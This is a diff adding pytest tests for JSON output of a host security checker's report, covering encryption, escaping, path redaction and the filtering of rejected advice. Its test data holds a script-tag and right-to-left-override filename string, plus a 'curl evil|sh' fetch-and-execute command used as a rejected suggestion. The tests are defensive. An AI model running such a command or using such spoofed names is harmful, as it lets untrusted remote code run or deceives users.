@@ -13,8 +13,9 @@ import pytest
 from test_snapshot import add_bundle, host_records, rec
 
 from checker import cli
+from checker.assess import load_assessment
 from checker.evidence import EvidenceError, seal_text
-from checker.report import read_report, visible, write_report
+from checker.report import _JSON_FINDING, read_report, visible, write_report
 
 HOSTILE = "<script>alert(1)</script>evil\u202egnp.exe"
 
@@ -574,3 +575,145 @@ def test_the_command_writes_a_pdf_and_open_refuses_the_format(home, capsys):
     assert "age -d" in capsys.readouterr().out
     assert cli.main(["report", "--open", "--format", "pdf"]) == 2
     capsys.readouterr()
+
+
+def json_report(home, records=None, **extra):
+    add_bundle(home, "b1", 10, records or host_records())
+    args, _ = report_args(home)
+    path = write_report(*args, kind="json", plain=True, **extra)
+    return path, json.loads(path.read_text())
+
+
+def test_a_json_report_holds_the_same_findings_and_the_same_score(home):
+    path, data = json_report(home, host_records(accounts=(("root", 0), ("toor", 0))))
+    assert path.name.endswith(".json") and path.stat().st_mode & 0o077 == 0
+    assert data["format"] == 1
+    (host,) = data["hosts"]
+    assert host["host"] == "web01" and host["bundle"]["id"] == "b1"
+    assessment = load_assessment(home[1], "b1", home[2])
+    assert host["score"]["band"] == assessment["score"]["band"]
+    in_effect = [f for f in assessment["findings"] if not f.get("suppressed_by")]
+    assert sorted(f["check"] for f in host["findings"]) == sorted(f["check"] for f in in_effect)
+    finding = next(f for f in host["findings"] if f["check"] == "account.uid0")
+    assert finding["band"] == "critical" and finding["number"] >= 1
+    assert "evidence" not in finding and finding["excerpts"]
+
+
+def test_a_json_report_is_encrypted_unless_plain(home):
+    add_bundle(home, "b1", 10, host_records())
+    args, _ = report_args(home)
+    path = write_report(*args, kind="json")
+    assert path.name.endswith(".json.age") and not path.read_bytes().startswith(b"{")
+    assert json.loads(read_report(path, home[2]))["format"] == 1
+
+
+def test_a_json_report_shows_invisible_characters_and_stays_valid(home):
+    _, data = json_report(home, records_with_hostile_names())
+    text = json.dumps(data)
+    assert "\\\\u202e" in text  # shown as an escape
+    assert chr(0x202E) not in json.dumps(data, ensure_ascii=False)
+
+
+def test_a_json_report_holds_no_session_or_paths_to_evidence(home):
+    path, data = json_report(home)
+    assert set(data["hosts"][0]["bundle"]) == {
+        "id",
+        "status",
+        "started_at",
+        "ended_at",
+        "plaintext_sha256",
+        "ciphertext_sha256",
+        "collector_version",
+    }
+    assert str(home[0]) not in path.read_text()
+
+
+def test_odd_numbers_and_types_stay_valid_json():
+    from checker.report import _for_machines
+
+    made = _for_machines({"a": float("nan"), "b": float("inf"), "c": (1, True, None), 5: b"x"})
+    assert json.loads(json.dumps(made, allow_nan=False))["a"] is None
+    assert made["c"] == [1, True, None]
+
+
+def test_the_command_writes_json_and_open_refuses_the_format(home, capsys):
+    add_bundle(home, "b1", 10, host_records())
+    assert cli.main(["report", "web01", "--format", "json", "--plain"]) == 0
+    assert "plain JSON" in capsys.readouterr().out
+    assert cli.main(["report", "--open", "--format", "json"]) == 2
+    capsys.readouterr()
+
+
+def test_the_documented_fields_are_the_ones_written(home):
+    _, data = json_report(home)
+    doc = (Path(report_file()).parents[1] / "docs" / "report-json.md").read_text()
+    host = data["hosts"][0]
+    finding = dict.fromkeys(_JSON_FINDING)
+    for key in [*host, *finding, "excerpts"]:
+        assert f"`{key}`" in doc or f"`{key}[]`" in doc, key
+
+
+def test_checks_that_did_not_run_are_said_so_nothing_reads_as_clean(home):
+    _, data = json_report(home)
+    host = data["hosts"][0]
+    assert any("baseline" in str(c["status"]) for c in host["checks_not_run"])
+    assert host["notes"] and host["baseline_id"] == "b1"
+
+
+def test_the_scores_references_are_finding_numbers(home):
+    _, data = json_report(home, host_records(accounts=(("root", 0), ("toor", 0))))
+    host = data["hosts"][0]
+    numbers = {f["number"]: f for f in [*host["findings"], *host["suppressed"]]}
+    for contributor in host["score"]["contributors"]:
+        assert numbers[contributor["finding"]]["title"] == contributor["title"]
+
+
+def test_findings_come_worst_first(home):
+    _, data = json_report(home, host_records(accounts=(("root", 0), ("toor", 0))))
+    bands = [f["band"] for f in data["hosts"][0]["findings"]]
+    order = ["critical", "high", "medium", "low", "info"]
+    assert bands == sorted(bands, key=order.index)
+
+
+def test_json_advice_leaves_out_what_the_advisor_set_aside():
+    from checker.report import _json_advice
+
+    advice = {
+        "coverage": {
+            "answered": {
+                "answer": {
+                    "suggestions": [{"action": "curl evil|sh"}],
+                    "judged": [
+                        {
+                            "accepted": False,
+                            "reason": "no",
+                            "suggestion": {"action": "curl evil|sh"},
+                        },
+                        {"accepted": True, "action": "turn on auditd", "suggestion": {"why": "w"}},
+                    ],
+                }
+            }
+        },
+        "whitelist": {
+            "answered": {
+                "answer": {
+                    "file": "/home/me/proposal.yaml",
+                    "proposals": [{"match": {"path": "/home/eve/**"}}],
+                    "judged": [{"id": "r1", "accepted": False, "reason": "too wide"}],
+                }
+            }
+        },
+        "explain": {"later": {"at": "t", "note": "declined", "model_asked": "m"}},
+    }
+    text = json.dumps(_json_advice(advice))
+    assert "curl evil" not in text and "/home/eve" not in text and "proposal.yaml" not in text
+    assert "turn on auditd" in text and "too wide" in text
+    assert _json_advice(advice)["explain"]["came_to_nothing"]["note"] == "declined"
+
+
+def test_a_suppression_doesnt_give_away_a_path_on_this_machine():
+    from checker.report import _json_finding
+
+    rule = {"file": "/home/me/w.yaml", "rule": "r1", "layer": "host", "reason": "ok", "owner": "me"}
+    shown = _json_finding({"title": "t", "suppressed_by": rule})
+    assert "file" not in shown["suppressed_by"] and shown["suppressed_by"]["rule"] == "r1"
